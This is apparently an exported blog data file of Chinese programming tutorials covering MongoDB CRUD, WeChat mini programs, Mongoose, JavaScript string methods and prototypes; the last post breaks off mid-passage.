文档的CRUD 插入文档——db.&lt;collecetion&gt;.insert(document) 123456789101112131415# 向test数据库中插入stus集合中插入一个新的学生对象db.stus.insert( &#123;name: \"小明\", gender: \"男\"&#125;)# 向test数据库中插入teather集合中插入2个新的老师对象db.teather.insert([ &#123;name: \"马云\", gender: \"男\"&#125;, &#123;name: \"马化腾\", gender: \"男\"&#125;])# db.stus.insertOne() 插入一个# db.stus.insertMany() 插入多个 查询文档——db.&lt;collection&gt;.find(query（查询条件）, projection（投影）) 操作 格式 范例 RDBMS中的类似语句 等于 {:} db.col.find({&quot;by&quot;:&quot;菜鸟教程&quot;}).pretty() where by = &#39;菜鸟教程&#39; 小于 {:{$lt:}} db.col.find({&quot;likes&quot;:{$lt:50}}).pretty() where likes &lt; 50 小于或等于 {:{$lte:}} db.col.find({&quot;likes&quot;:{$lte:50}}).pretty() where likes &lt;= 50 大于 {:{$gt:}} db.col.find({&quot;likes&quot;:{$gt:50}}).pretty() where likes &gt; 50 大于或等于 {:{$gte:}} db.col.find({&quot;likes&quot;:{$gte:50}}).pretty() where likes &gt;= 50 不等于 {:{$ne:}} db.col.find({&quot;likes&quot;:{$ne:50}}).pretty() where likes != 50 12345# 查询 “likes” 大于50，并且“by”为“菜鸟教程”或者“title”为“MongoDB 教程”的数据db.col.find(&#123; \"likes\": &#123;$gt:50&#125;, $or: [&#123;\"by\": \"菜鸟教程\"&#125;,&#123;\"title\": \"MongoDB 教程\"&#125;]&#125;).pretty() 案例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# 向 bios 集合插入如下文档&#123; \"_id\" : &lt;value&gt;, \"name\" : &#123; \"first\" : &lt;string&gt;, \"last\" : &lt;string&gt; &#125;, // embedded document \"birth\" : &lt;ISODate&gt;, \"death\" : &lt;ISODate&gt;, \"contribs\" : [ &lt;string&gt;, ... ], // Array of Strings \"awards\" : [ &#123; \"award\" : &lt;string&gt;, year: &lt;number&gt;, by: &lt;string&gt; &#125; // Array of embedded documents ... ]&#125;# 全部查询# 查询所有数据db.bios.find()# 标准查询# 查询_id 为5的数据db.bios.find( &#123; _id: 5 &#125; )# 查询 name 对象下的 last 属性值为 Hopper 的所有数据db.bios.find( &#123; \"name.last\": \"Hopper\" &#125; )# 使用运算符的查询# 使用$in操作符返回id等于5和ObjectId为(“507c35dd8fada716c89d0013”)的文档db.bios.find( &#123; _id: &#123; $in: [ 5, ObjectId(\"507c35dd8fada716c89d0013\") ] &#125; &#125;)# 查询 生日大于 new Date('1950-01-01') 的文档db.bios.find( &#123; birth: &#123; $gt: new Date('1950-01-01') &#125; &#125; )# 查询 name 对象下的 last 属性值符合 /^N/表达式 的所有数据db.bios.find( &#123; \"name.last\": &#123; $regex: /^N/ &#125; &#125;) # 查询范围# 查询 生日大于 new Date('1940-01-01') 小于 new Date('1960-01-01' 的文档db.bios.find( &#123; birth: &#123; $gt: new Date('1940-01-01'), $lt: new Date('1960-01-01') &#125; &#125;)# 查询 生日大于 new Date('1920-01-01') 并且 death 为 false 的文档db.bios.find( &#123; birth: &#123; $gt: new Date('1920-01-01') &#125;, death: &#123; $exists: false &#125;&#125; ) # 查询精确匹配嵌入的文档# 查询 name 对象为 &#123; first: \"Yukihiro\", last: \"Matsumoto\" &#125; 的文档（包括顺序，并且不能包含其他属性）db.bios.find( &#123; name: &#123; first: \"Yukihiro\", last: \"Matsumoto\" &#125; &#125;)# 嵌入式文档的查询字段# 其中嵌入的文档名称包含第一个值为“Yukihiro”的字段和最后一个值为“Matsumoto”的字段。db.bios.find( &#123; \"name.first\": \"Yukihiro\", \"name.last\": \"Matsumoto\" &#125;)# 查询数组元素# 查询数组字段contribs包含元素“UNIX”db.bios.find( &#123; contribs: \"UNIX\" &#125; )# 数组字段设计包含元素“ALGOL”或“Lisp”db.bios.find( &#123; contribs: &#123; $in: [ \"ALGOL\", \"Lisp\" ]&#125; &#125; )# 数组字段设计包含元素“ALGOL”和“Lisp”db.bios.find( &#123; contribs: &#123; $all: [ \"ALGOL\", \"Lisp\" ] &#125; &#125; )# contribs的数组大小为4db.bios.find( &#123; contribs: &#123; $size: 4 &#125; &#125; ) 更新文档 123456789db.collection.update( &lt;query&gt;, # update的查询条件，类似sql update查询内where后面的。 &lt;update&gt;, # 更新内容 &#123; upsert: &lt;boolean&gt;, # 如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。 multi: &lt;boolean&gt;, # 可选，mongodb 默认是false,是否只更新第一条 writeConcern: &lt;document&gt; # 可选，抛出异常的级别。 &#125;) 123456789101112131415161718192021# db.&lt;collecetion&gt;.update(查询条件, 修改条件)# - update 会默认将 新对象 替换 旧对象# - 如果是修改指定的属性，而不是替换，需要使用“替换操作符”来完成修改# $set 可以用来修改文档中的指定的属性# $unset 可以用来删除文档中的指定的属性db.stus.update( &#123;gender: \"女\", name: \"蜘蛛精\" &#125;, &#123;gender: \"男\", name: \"孙悟空\", age: 30 &#125;)db.stus.update(&#123;name: \"one\" &#125;, &#123; $set: &#123; gender: \"男\", name: \" 猪八戒\", addr: \"高老庄\" &#125;&#125;, &#123; multi: true&#125;) 删除文档 12345678910111213141516db.&lt;collecetion&gt;.remove( 删除条件, 是否删除一个&lt;true为删除一个，默认false&gt;)# 会删除符合条件的所有数据# 如果传递一个空对象，会把所有数据删除db.&lt;collecetion&gt;.remove(&#123;&#125;) # 性能较差，删除数据，但是不清空集合db.&lt;collecetion&gt;.deleteOne(删除条件)db.&lt;collecetion&gt;.deleteMany(删除条件)show collecetionsdb.dropDatabase() # 删除 数据库db.&lt;collecetion&gt;.drop() # 清空集合 条件操作符1$gt &gt; $gte &gt;= $lt &lt; $lte &lt;= $ne != $eq = $type操作符 根据字符数据类型查询 12345678910db.col.insert([ &#123;title: 'PHP 教程'&#125;, &#123;title: 'Java 教程'&#125;, &#123;title: 'MongoDB 教程'&#125;])# 查询 title 为 string 的文档db.col.find(&#123;\"title\" : &#123;$type : 2&#125;&#125;)或db.col.find(&#123;\"title\" : &#123;$type : 'string'&#125;&#125;) Limit与Skip方法12db.COLLECTION_NAME.find().limit(NUMBER) # 限制查询多少条db.COLLECTION_NAME.find().skip(NUMBER) # 跳过多少条 sort() 方法1db.col.find(&#123;&#125;).sort(&#123;\"likes\":-1&#125;) # 数据按字段 likes 的降序排列 1为升序 -1为降序 createIndex() 方法索引存储在一个易于遍历读取的数据集合中，索引是对数据库表中一列或多列的值进行排序的一种结构。 12345678910db.col.createIndex(&#123;\"title\":1&#125;)# 1、查看集合索引db.col.getIndexes()# 2、查看集合索引大小db.col.totalIndexSize()# 3、删除集合所有索引db.col.dropIndexes()# 4、删除集合指定索引db.col.dropIndex(\"索引名称\")","categories":[{"name":"数据库","slug":"数据库","permalink":"http://yoursite.com/categories/数据库/"}],"tags":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://yoursite.com/tags/MongoDB/"}]},{"title":"WXMiniProgram","slug":"WXMiniProgram","date":"2020-06-22T10:00:46.000Z","updated":"2020-07-14T09:49:06.199Z","comments":true,"path":"posts/6316.html","link":"","permalink":"http://yoursite.com/posts/6316.html","excerpt":"","text":"1.开发准备 账号申请 选择注册账号类型 —— 小程序 账号信息 邮箱激活 信息登记 绑定开发者 登录小程序 管理员授权 添加成员 获取AppID 设置——开发设置 开发工具 下载—扫码登录—选择小程序—创建小程序—预览模板界面 官方文档 2.结构分析以下是小程序的基本目录结构，也可以根据需要任意添加其它目录，如资源目录 assets、第三方库vendors、扩展目录 extends等。 12345678910111213141516├── app.js ...................小程序入口文件├── app.json .................小程序全局配置├── app.wxss .................小程序全局样式├── pages ....................所有页面目录│ ├── index ................index页面目录│ │ ├── index.js .........index页面业务逻辑│ │ ├── index.wxml .......index页面布局结构│ │ └── index.wxss .......index页面布局样式│ └── logs .................logs页目录│ ├── logs.js ..........logs页面业务逻辑│ ├── logs.json ........logs页面配置文件│ ├── logs.wxml ........logs页面布局结构│ └── logs.wxss ........logs页面布局样式├── project.config.json ......开发工具配置文件└── utils ....................公共逻辑 └── util.js ..............实用工具 ==主体 app：一个小程序主体部分由三个文件组成，放在项目的根目录（如果项目使用gulp或者webpack打包，则需要在project.config.js 指定 &quot;miniprogramRoot&quot;: &quot;路径“ 属性）== 2.1全局配置通过 app.json 文件对小程序进行全局配置，如页面文件的路径、窗口表现、设置网络超时时间、设置多 tab 等。 app.json 配置清单 属性 类型 必填 描述 pages String Array 是 设置页面路径 window Object 否 设置默认窗口表现 tabBar Object 否 设置底部 tab 表现 networkTimeout Object 否 设置网络超时时间 debug Boolean 否 设置是否开启调试模式 app.json 示例 123456&#123; \"pages\":[ \"pages/index/index\", \"pages/detail/index\" ]&#125; window 对象类型，用于设置小程序的状态栏、导航条、标题、窗口背景色。 属性 类型 默认值 描述 兼容 navigationBarBackgroundColor HexColor #000000 导航栏背景颜色，如”#000000” - navigationBarTextStyle String white 导航栏标题颜色，仅支持 black/white navigationBarTitleText String 导航栏标题文字内容 backgroundColor HexColor #ffffff 窗口的背景色 查看window更多配置属性 编辑 app.json，添加字段 windows 12345678&#123; \"window\": &#123; \"navigationBarBackgroundColor\": \"#262626\", \"navigationBarTitleText\": \"XXX\", \"navigationBarTextStyle\": \"white\", \"backgroundColor\": \"#F0F0F0\" &#125;&#125; tabBar 对象类型，配置项指定 tab 栏的表现，以及 tab 切换时显示的对应页面。 属性 类型 必填 默认值 描述 color HexColor 是 tab 上的文字默认颜色 selectedColor HexColor 是 tab 上的文字选中时的颜色 backgroundColor HexColor 是 tab 的背景色 borderStyle String 否 black tabbar上边框的颜色， 仅支持 black/white list Array 是 tab 的列表，最少2个、最多5个 position String 否 bottom 可选值 bottom、top 当设置 position 为 top 时，将不会显示 icon tabBar 中的 list 是一个数组，只能配置最少2个、最多5个 tab，tab 按数组的顺序排序。 其中 list 接受一个数组，数组中的每个项都是一个对象，其属性值如下： 属性 类型 必填 描述 pagePath String 是 页面路径，必须在 pages 中先定义 text String 是 tab 上按钮文字 iconPath String 否 图片路径，icon 大小限制为40kb，建议尺寸为 81px * 81px，当 postion 为 top 时，此参数无效，不支持网络图片 selectedIconPath String 否 选中时的图片路径，icon 大小限制为40kb，建议尺寸为 81px * 81px ，当 postion 为 top 时，此参数无效 2.2页面配置 每个页面可以有不同的表现，通过 pages 目录下的 .json 文件，如 logs.json ，实现页面的局部配置。 但是只能设置 app.json 中的 window 配置项的内容，页面中配置项会覆盖 app.json 的 window 中相同的配置项。 属性 类型 默认值 描述 navigationBarBackgroundColor HexColor #000 导航栏背景颜色 navigationBarTextStyle String white 导航栏标题颜色，仅支持 black/white navigationBarTitleText String 导航栏标题文字内容 backgroundColor HexColor #fff 窗口的背景色 12345// 在 pages/center 目录下创建 index.jsonFC/pages/center├── index.js├── index.json└── index.wxml 如下所示，编辑 index.json 12345&#123; \"navigationBarBackgroundColor\": \"#ffffff\", \"navigationBarTextStyle\": \"white\", \"navigationBarTitleText\": \"我的\"&#125; 2.3适配、样式和组件一句话：开发小程序时所有屏幕宽度都是 750rpx。 rpx（responsive pixel）可以根据屏幕宽度进行自适应。规定所有屏幕宽为750rpx。 rpx 与 px 的换算关系： 设备 屏幕尺寸 rpx换算px (屏幕宽度/750) px换算rpx (750/屏幕宽度) iPhone5 320px 1rpx = 0.42px 1px = 2.34rpx 小米MIX 2S 360px 1rpx = 0.48px 1px = 2.083rpx iPhone6 375px 1rpx = 0.5px 1px = 2rpx iPhone6 Plus 414px 1rpx = 0.552px 1px = 1.81rpx HUAWEI Mate 10 480px 1rpx = 0.64px 1px = 1.562rpx 样式导入 使用 @import 语句可以导入外联样式表， @import 后跟需要导入的外联样式表的相对路径，用 ; 表示语句结束。 1234/** common.wxss **/page &#123; background: #F0F0F0;&#125; 12345/** index.wxss **/@import \"common.wxss\";page &#123; background: #F2F2F2;&#125; 内联样式 外部样式 image 相当于 html 中的 img 标签，用来加载图片。 1234&lt;!-- 通过 src 属性加载图片 --&gt;&lt;!-- 通过 mode 属性调整 图片的的显示方式 (裁切/缩放) --&gt;&lt;!-- image 组件默认宽度为300px，默认高度为225px --&gt;&lt;image src=\"../../static/uploads/item_1.png\" mode=\"aspectFit\"&gt;&lt;/image&gt; 关于 mode 有效值 text 相当于 html 中的 span，用来定义文本。 view 相当于 html 中的 div，一般做为容器出现。 swiper 滑块组件，可以用来实现类似轮播图布局效果。 3.基本语法数据绑定类似vue 123456789101112// pages/demo/data.jsPage(&#123; // 通过 data 属性，初始化页面中用到的数据 data: &#123; message: 'hello world!' user: &#123; name: '小明', age: 16 &#125;, courses: ['wxml', 'wxss', 'javascript'] &#125;&#125;); 1234567&lt;!-- pages/demo/data.wxml --&gt;&lt;text class=\"msg\"&gt;&#123;&#123;message&#125;&#125;&lt;/text&gt;&lt;text&gt; 我叫&#123;&#123;user.name&#125;&#125;， 我今年&#123;&#123;user.age&#125;&#125;岁了， 我在学习&#123;&#123;courses[0]&#125;&#125;课程。&lt;/text&gt; 列表数据123456789101112131415161718// pages/demo/data.jsPage(&#123; // 通过 data 属性，初始化页面中用到的数据 data: &#123; brands: [ &#123; name: '耐克', origin: '美国', category: ['男装', '女装', '鞋', '体育用品'] &#125;, &#123; name: 'SK-II', origin: '韩国', category: ['防晒霜','面膜', '洗护'] &#125; ] &#125;&#125;); 1234567891011&lt;!-- pages/demo/data.wxml --&gt;&lt;view wx:for=\"&#123;&#123;brands&#125;&#125;\" wx:for-index=\"k\" wx:for-item=\"v\"&gt; &lt;view&gt; &lt;text&gt;&#123;&#123;k+1&#125;&#125; &lt;/text&gt; &lt;text&gt; &#123;&#123;v.name&#125;&#125; &lt;/text&gt; &lt;text&gt; &#123;&#123;v.origin&#125;&#125;&lt;/text&gt; &lt;/view&gt; &lt;view&gt; &lt;text wx:for=\"&#123;&#123;v.category&#125;&#125;\"&gt;&#123;&#123;item&#125;&#125;&lt;/text&gt; &lt;/view&gt;&lt;/view&gt; wx:for 属性将当前组件按着数组的长度动态创建，并且通过 index 变量可以访问到数组的索引值，通过item变量可以访问到单元值。 block12345&lt;!-- pages/demo/data.wxml --&gt;&lt;block wx:for=\"&#123;&#123;users&#125;&#125;\"&gt; &lt;text&gt;&#123;&#123;item.name&#125;&#125;&lt;/text&gt; &lt;text&gt;&#123;&#123;item.age&#125;&#125;&lt;/text&gt;&lt;/block&gt; 条件数据12345678&lt;view wx:for=\"&#123;&#123;users&#125;&#125;\"&gt; &lt;text&gt;&#123;&#123;index+1&#125;&#125; &lt;/text&gt; &lt;text&gt; &#123;&#123;item.name&#125;&#125;&lt;/text&gt; &lt;text&gt; &#123;&#123;item.age&#125;&#125; &lt;/text&gt; &lt;text wx:if=\"&#123;&#123;item.age &lt;= 14&#125;&#125;\"&gt; 儿童&lt;/text&gt; &lt;text wx:elif=\"&#123;&#123;item.age &lt;= 18&#125;&#125;\"&gt; 未成年&lt;/text&gt; &lt;text wx:else&gt; 成年人&lt;/text&gt;&lt;/view&gt; 123456789Page(&#123; data: &#123; users: [ &#123;name: '小明', age: 18&#125;, &#123;name: '小红', age: 13&#125;, &#123;name: '小丽', age: 19&#125; ] &#125;&#125;); 事件触发语法格式： bind:事件名称=”回调函数” 12&lt;button type=\"primary\" bind:tap=\"sayHi\"&gt;点我试试&lt;/button&gt;&lt;input type=\"text\" bind:focus=\"sayHi\" bind:blur=\"sayBye\" /&gt; 12345678910111213// pages/demo/data.jsPage(&#123; sayHi: function () &#123; console.log('Hi~') &#125;, sayHi: function () &#123; console.log('Hi~'); &#125;, sayBye: function (ev) &#123; // ev 时间对象 console.log(ev); console.log('Bye~'); &#125;&#125;); 事件冒泡 子元素用bindtap绑定事件后，执行的时候，会冒泡到父元素（触发父亲元素上绑定的bindtap事件） 如果不想冒泡到父元素，可以用catchtap代替 12&lt;botton catchtap=\"goDetail\"&gt;catchtap&lt;/botton&gt;&lt;botton bindtap=\"goDetail\"&gt;bindtap&lt;/botton&gt; 4.生命周期","categories":[{"name":"微信","slug":"微信","permalink":"http://yoursite.com/categories/微信/"}],"tags":[{"name":"微信小程序","slug":"微信小程序","permalink":"http://yoursite.com/tags/微信小程序/"}]},{"title":"Mongoose","slug":"Mongoose","date":"2020-06-18T07:20:24.000Z","updated":"2020-07-14T09:49:06.198Z","comments":true,"path":"posts/40119.html","link":"","permalink":"http://yoursite.com/posts/40119.html","excerpt":"","text":"Mongoose 是基于nodejs，使用javascript编程，连接mongodb数据库的软件包，使mongodb的文档数据模型变的优雅起来，方便对mongodb文档型数据库的连接和增删改查等常规数据操作。 mongoose是当前使用mean（mongodb express angularjs nodejs）全栈开发必用的连接数据库软件包。 参考资料： 在线数据库 mongoose guide 后台与数据库交互 使用数据库的原生语言（例如 SQL） 使用对象数据模型（Object Data Model，简称 ODM）或对象关系模型（Object Relational Model，简称 ORM）。 ODM / ORM 能将网站中的数据表示为 JavaScript 对象，然后将它们映射到底层数据库。一些 ORM 只适用某些特定数据库，还有一些是普遍适用的。 使用 SQL 或其它受到支持的查询语言才能达到最佳性能。 ODM 通常慢一些，因为在对象和数据库格式之间存在一层用于映射的翻译代码，使它不一定会选用最高性能的数据库查询（尤其是普遍使用级别的 ODM，它必须在各类数据库功能方面做出更大的折衷）。 使用 ORM 的好处是：程序员可以继续用 JavaScript 对象的思维而不用转向数据库语义的思维。 在（同一个或不同网站）使用不同数据库时尤为明显。使用 ORM 还可以更方便地对数据进行验证和检查。 Mongoose Mongoose是在node.js异步环境下对mongodb进行便捷操作的对象模型工具 Mongoose 的优点： 可以为文档创建一个模式结构（Schema） 可以对模型中的对象/文档进行验证 数据可以通过类型转换为对象模型 可以使用中间件来应用业务逻辑挂钩 比 Node 原生的 MongoDB 驱动更容易Mongoose 是最受欢迎的 ODM，选用 MongoDB 数据库时，它是一个合理的选择。 新的对象： Schema（模式对象）— Schema对象定义约束了数据库中的文档结构 Model— Model对象作为集合中的所有文件的表示，相当于MondoDB数据库中的集合collection Document— Document 表示集合中的具体文档，相当于集合中的一个具体的文档 mongoose 连接数据库123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// 1.下载 npm init -y &amp; npm i mongoose -S// 2.引入 mongooseconst mongoose = require('mongoose')// 4.监听mongoDB数据库的连接状态mongoose.connection.once('open', () =&gt; &#123; console.log('成功连接到 mongoDB 数据库')&#125;)mongoose.connection.once('close', () =&gt; &#123; console.log('断开 mongoDB 数据库')&#125;)// 3.连接数据库// mongoose.connect('mongodb://数据库ip地址:端口号(默认：27017)/数据库名')mongoose.connect( 'mongodb://127.0.0.1/test', &#123; useNewUrlParser: true, useUnifiedTopology: true &#125;, (err, db) =&gt; &#123; console.log('连接数据库成功') &#125;)// mongoose 断开连接// mongoose.disconnect()// 定义一个schemaconst Schema = mongoose.Schema// model模型const stuSchema = new Schema(&#123; name: String, age: Number, gender: &#123; type: String, default: 'female' &#125;, address: String&#125;)// 创建一个 model -&gt; collection # mogoose.model(modelName, schema)const StuModel = mongoose.model('stus', stuSchema)// 测试：创建一个文档插入到数据库中// StuModel.create(&#123;// name: 'houfei',// age: 25,// gender: 'male',// address: '河北'// &#125;, err =&gt; &#123;// if(!err) console.log('插入成功')// else console.log('插入失败')// &#125;) Model的APIdocument 是 model 的实例 插入12345678910111213// StuModel.create(object1, object2, ..., (err, object1, object2, ...) = &gt; &#123; &#125;)// StuModel.create(array, (err, array) = &gt; &#123; &#125;)StuModel.create( [&#123; name: 'liming', age: 23, gender: 'male', address: '安徽' &#125;], (err, array) =&gt; &#123; console.log(array) if(!err) console.log('插入成功') else console.log('插入失败')&#125;) 查询数据12345678910111213141516/** * filter 查询条件 * projection 投影 * options 查询选项 skip limit * callback 回调函数 Model.find(filter, [projection], [options], [callback]) Model.findById() Model.findByIdAndDelete() Model.findByIdAndRemove() Model.findByIdAndUpdate() Model.findOne() Model.findOneAndDelete() Model.findOneAndRemove() Model.findOneAndReplace() Model.findOneAndUpdate()*/ 123456// 在 StuModel 查询 name 为 jack，并且 age 大于 22的所有array文档，并且只显示 name age 属性，不显示 _id 属性， array并且要跳过 skip 第一条数据StuModel.find(&#123; name: 'jack', age: &#123; $gte: 22 &#125; &#125;, 'name age -_id', &#123; skip: 1 &#125;, (err, docs) =&gt; &#123; console.log(docs) if(!err) console.log('查询成功') else console.log('查询失败')&#125;) 12345StuModel.findOne(&#123; age: &#123; $gte: 19 &#125; &#125;, 'name age -_id', &#123;&#125;, (err, doc) =&gt; &#123; console.log(doc) if(!err) console.log('查询成功') else console.log('查询失败')&#125;) 12345StuModel.findById('5ee9f47cf67607ea5eda6894', 'name', &#123; &#125;, (err, doc) =&gt; &#123; console.log(doc instanceof StuModel) if(!err) console.log('查询成功') else console.log('查询失败')&#125;) 更新数据123456789101112131415/*Model.updateMany(filter, doc, [options], [callback])Model.updateOne(filter, doc, [options], [callback])Model.replaceOne(filter, doc, [options], [callback])*/StuModel.updateOne(&#123;name: \"houfei\"&#125;, &#123; $set: &#123; age: 1 &#125;&#125;, &#123;multi: false&#125;, (err, status) =&gt; &#123; console.log(status) if(!err) console.log('修改成功') else console.log('修改失败')&#125;) 删除数据12345678910/*Model.deleteMany(conditions, [options], [callback])Model.deleteOne(conditions, [options], [callback])*/StuModel.deleteOne(&#123;name: \"houfei\"&#125;, (err, state) =&gt; &#123; console.log(state) if(!err) console.log('删除成功') else console.log('删除失败')&#125;) Document的API1234567// 创建 Document 对象let stu = new StuModel(&#123; name: '李白', age: 30, gender: 'female', address: '四川'&#125;) doc.save()123456// 保存方法 savestu.save((err, state) =&gt; &#123; console.log(state) if(!err) console.log('添加成功') else console.log('添加失败')&#125;) doc.update()123456789101112131415StuModel.findOne(&#123;&#125;, (error, doc) =&gt; &#123; /** * Document.prototype.update(doc, options, callback) * doc «Object» * options «Object» * callback «Function» */ doc.update(&#123;$set: &#123; age: 1 &#125;&#125;,(err, status) =&gt; &#123; console.log(status) if(!err) console.log('修改成功') else console.log('修改失败') &#125;)&#125;) doc.get()|.set()|id12345StuModel.findOne(&#123;&#125;, (error, doc) =&gt; &#123; console.log(doc.id) doc.get('address', String) doc.set('age', 99)&#125;) doc.toJSON()|toObject12345StuModel.findOne(&#123;&#125;, (error, doc) =&gt; &#123; let a = doc.toJSON() let b = doc.toObject() console.log(a, b)&#125;) Mongoose模块化 视频地址 拓展甘特图GitHub guide 流程图12345graph TD; A--&gt;B; A--&gt;C; B--&gt;D; C--&gt;D; 顺序图1234567891011sequenceDiagram participant Alice participant Bob Alice-&gt;&gt;John: Hello John, how are you? loop Healthcheck John-&gt;&gt;John: Fight against hypochondria end Note right of John: Rational thoughts &lt;br/&gt;prevail! John--&gt;&gt;Alice: Great! John-&gt;&gt;Bob: How about you? Bob--&gt;&gt;John: Jolly good! 甘特图12345678910ganttdateFormat YYYY-MM-DDtitle Adding GANTT diagram to mermaidexcludes weekdays 2014-01-10section A sectionCompleted task :done, des1, 2014-01-06,2014-01-08Active task :active, des2, 2014-01-09, 3dFuture task : des3, after des2, 5dFuture task2 : des4, after des3, 5d 其他一1234567graph LR A(开始) --&gt;B(起床) B --天气不好--- C&gt;干活] C ==&gt; D&#123;休息时间到了&#125; D -.yes.-&gt; E((休息)) D -.no.-&gt; C E --&gt; F(吃饭) 其他二123456789101112sequenceDiagram对象A-&gt;&gt;对象B:中午吃什么？对象B-&gt;&gt;对象A: 随便loop 思考 对象A-&gt;对象A: 努力搜索end对象A--&gt;&gt;对象B: 火锅？对象B-&gt;&gt;对象A: 可以Note left of 对象A: 我是一个对象ANote right of 对象B: 我是一个对象Bparticipant 对象CNote over 对象C: 我自己说了算 其他三1234567891011121314151617181920gantt dateFormat YYYY-MM-DD title 软件开发甘特图 section 设计 需求:done,des1, 2019-01-06,2019-01-08 原型:active,des2, 2019-01-09, 3d UI设计:des3, after des2, 5d 未来任务:des4, after des3, 5d section 开发 学习准备理解需求:crit, done, 2019-01-06,24h 设计框架:crit, done, after des2, 2d 开发:crit, active, 3d 未来任务:crit, 5d 休息时间:2d section 测试 功能测试:active, a1, after des3, 3d 压力测试:after a1, 20h 测试报告: 48h","categories":[{"name":"数据库","slug":"数据库","permalink":"http://yoursite.com/categories/数据库/"}],"tags":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://yoursite.com/tags/MongoDB/"}]},{"title":"字符串常用方法","slug":"字符串常用方法","date":"2020-06-18T07:09:21.438Z","updated":"2020-06-18T07:09:21.438Z","comments":true,"path":"posts/47556d42.html","link":"","permalink":"http://yoursite.com/posts/47556d42.html","excerpt":"","text":"字符串常用方法​ 字符串所有的方法，都 不会修改字符串本身(字符串是不可变的)，操作完成会 返回一个新的字符串。 ES5及以前的方法 转换为字符串 12345let age = 10;var ageStr = age.toString('进制') // 可为：2,8,10,16，不填默认为十进制// 注意 null 和 undefined 值没有这个方法String(age)// '10' 字符方法——获取字符串中的单个字符 12字符串.charAt(index); // 返回索引对应的字符字符串[index]; // 推荐使用 字符串操作——拼接 和 截取 12345678910111213// 拼接字符串.concat(str1,str2,str3...);拼接符 + //推荐使用// 截取字符串.slice(start,end) // 前包后不包// slice() substring() substr() 第一个参数是开始位置，// slice() substring() 但是，第二个参数是结束位置// substr() 第二个参数是 返回的长度let str = abcdefgconsole.log(str.slice(2,4)); // cdconsole.log(str.substring(2,4)); // cdconsole.log(str.substr(2,4)); // cdef 字符串位置方法——查询字符是否在字符串中存在 12字符串.indexOf(); 字符串.lastIndexOf(); 去除空白符 1字符串.trim(); // 去除字符串两边的空格 字母字符大小写转换 12字符串.toUpperCase(); // 转换大写 重点字符串.toLowerCase(); // 转换小写 重点 字符串替换 1字符串.replace(newStr,oldStr); 字符串分割 1字符串.split(sp); // 把一个字符串分割成字符串数组。 ES6+ 新方法let str = &#39;abcdefg&#39; for···of···字符串的遍历器接口 12345// for···of···字符串的遍历器接口 for( let codePoint of str) &#123; console.log(codePoint) // 返回字符串的每一个字符 console.log(typeof codePoint) // string &#125; includes() 、startsWith()、 endsWith() 返回的都是boolean值 1234567// includes() startsWith() endsWith() 返回的都是boolean值// includes() 表示是否能找到参数// startsWith() 表示参数字符串是否在源字符串开始// endsWith() 表示参数字符串是否在源字符串结尾console.log(str.includes('cd')) // trueconsole.log(str.startsWith('ab')) // trueconsole.log(str.endsWith('fg')) // true repeat() 将源字符串复制一遍，返回新的字符串 12// 参数是小数 会被取整，0返回空，Infinity或负数会报错，NaN等同于0console.log(str.repeat(3)) // abcdefgabcdefgabcdefg padStart() 、padEnd() 字符串补全 123// 如果某个字符串不够指定长度，会在头部或尾部补全长度console.log(str.padStart(10,'0')) // 000abcdefgconsole.log(str.padEnd(10,'0')) // abcdefg000 获取字符串中出现最多的字符和次数 将字符串变化一种格式：字符串的每一个字符作为对象的键，字符出现的次数作为值，这就形成一个新的对象。 遍历这个对象，比较每一个键值对的值，取最大的键值对，即得到字符串出现最多的字符和出现的次数。 1234567891011121314151617181920212223242526272829&lt;script&gt; /* 判断一个字符串中出现最多的字符和出现的次数 */ var str = 'aabbccddd'; var obj = &#123;&#125;; /* 定义一个空的对象来接收结果 */ for (var i = 0; i &lt; str.length; i++) &#123; /* charAt获取字符串的索引 */ /* 判断obj是否存在一个为 obj[str.charAt(i)] 的键 如果不存在，那么就添加这个键，并且赋值为 1 如果已经存在这个键，那么就给这个键的值加1 */ if (!obj[str.charAt(i)]) &#123; obj[str.charAt(i)] = 1; &#125; else &#123; obj[str.charAt(i)]++; &#125; &#125; console.log(obj); /* 假设一个为0的值 和 一个空的字符串来存放键 for in 遍历obj对象 然后把每一个值和max对比 然后获取最大的值max 和 最大值对应的键maxno */ var max = 0; var maxno = ''; for (var k in obj) &#123; if (obj[k] &gt; max) &#123; max = obj[k]; maxno = k; &#125; &#125; console.log(max + ' ' + maxno);&lt;/script&gt;","categories":[{"name":"JavasCript","slug":"JavasCript","permalink":"http://yoursite.com/categories/JavasCript/"}],"tags":[{"name":"JavasCript","slug":"JavasCript","permalink":"http://yoursite.com/tags/JavasCript/"}]},{"title":"js中的原型及原型链","slug":"js中的原型及原型链","date":"2020-06-18T07:09:21.435Z","updated":"2020-06-18T07:09:21.436Z","comments":true,"path":"posts/8814181e.html","link":"","permalink":"http://yoursite.com/posts/8814181e.html","excerpt":"","text":"对象概念：首先，对象是JavaScript中的一个基本数据类型，是一种复合值；它用一个（对象）名字命名，把一系列的属性和方法都包装在一个集合中，可以对象名访问这些属性和方法，即属性的无序集合。 通过字面量创建对象12345//通过字面量创建对象var obj1 = &#123; name:'Jack', age: 18 &#125; 通过系统自带的构造函数构造对象12345// 通过系统自带的构造函数构造对象// 其他构造函数有：new Array(),new Number,new Date(),new Boolean() var obj2 = new Object(); obj2.name = 'Jack'; obj2.age = 18; 通过自定义函数构造对象1234567891011// 通过自定义函数构造对象// 为了和普通函数区别，构造函数命名首字母要大写（帕斯卡命名法） function Obj3(name,age) &#123; this.name = name; this.age = age; this.sayHi = function () &#123; alert(this.name) &#125;; &#125; var dx1 = new Obj3('Jack', 18); var dx2 = new Obj3('Brush', 18); new关键字首先，我先说下自定义构造函数创建对象的基本流程，使用new和不适用new差别很大，不用new的话，则Obj3(name)就作为一个普通的函数执行（只是函数名的首字母大写了），没有返回值，那么默认返回的是undefined，而用new关键字后，JS就会把该函数作为一个构造函数看待，经过一系列的隐式操作，返回值是一个对象了。 new关键字的“隐式操作”： ①在内存中创建一个空的Object类型的对象—-看不到 ②让this关键字指向这个空的对象（将构造函数的作用域赋给新对象）—-看不到 1234// ① ② 的执行过程var this = Object.creat(Obj3.prototype);// this 指向 Obj3.prototype(后面讲到)// 可以看出构造函数创建对象的最根本原理是借用Object.create()方法来实现的，只不过被封装功能化了 在前面的例子中，dx1和dx2分别保存着Obj3的一个不同的实例。这俩个对象都有有一个constructor（构造函数）的属性，该属性指向Obj3，如下： 